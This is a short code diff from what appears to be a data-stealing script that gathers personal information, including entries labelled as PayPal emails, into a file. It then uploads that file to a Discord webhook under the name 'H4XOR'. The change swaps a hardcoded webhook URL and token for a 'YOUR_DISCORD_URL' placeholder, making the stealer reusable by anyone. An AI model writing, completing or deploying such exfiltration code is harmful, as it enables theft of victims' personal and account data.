@@ -193,7 +193,7 @@ def main():
             elif all_data_p[m][1] == 2:
                 f.write(f"Email (Paypal) {all_data_p[m][0]}\n-------------------------------\n")
                 discord_info_w(m, 2)
-    webhook = DiscordWebhook(url="https://discord.com/api/webhooks/990720878738300948/mY9EazrB1DBNKCNYbuHc5Y4-qKb5wA9rl11jiUHUB1SzOaBYzFbwvjabhowpZE29GTxe", content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
+    webhook = DiscordWebhook(url="YOUR_DISCORD_URL", content=Personnal_info, username='H4XOR', avatar_url="https://images-ext-1.discordapp.net/external/0b5bkDNyeu-6aaEBkJECuydS2b0hIFcnnSNuvhlUjbM/https/i.pinimg.com/736x/42/d2/f5/42d2f541c7e6437272b01920b97a7282.jpg")
     with open("Cooked_data.txt", "rb") as f:
         webhook.add_file(file=f.read(), filename='data.txt')
     webhook.execute()
